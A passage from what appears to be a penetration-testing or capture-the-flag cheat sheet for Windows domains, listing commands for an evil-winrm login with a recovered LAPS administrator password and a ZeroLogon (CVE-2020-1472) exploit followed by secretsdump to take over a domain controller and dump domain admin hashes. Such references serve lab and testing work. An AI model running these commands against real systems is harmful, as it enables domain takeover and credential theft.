**PROOF:** user added to the privileged group / shell as the runner identity on next fire.

### LAPS-managed local admin password
Recovered a LAPS password for the local Administrator.
```bash
evil-winrm -i <TARGET> -S -u administrator -p '<PASS>'
```
**PROOF:** admin shell; `root.txt`.

### ZeroLogon DC takeover (alternative)
Unpatched DC vulnerable to the Netlogon auth bypass.
```bash
python cve-2020-1472-exploit.py <TARGET> <IP>
secretsdump.py -no-pass -just-dc '<TARGET>$'@<IP>
```
**PROOF:** DC machine-account password zeroed; domain admin hash dumped (CVE-2020-1472).
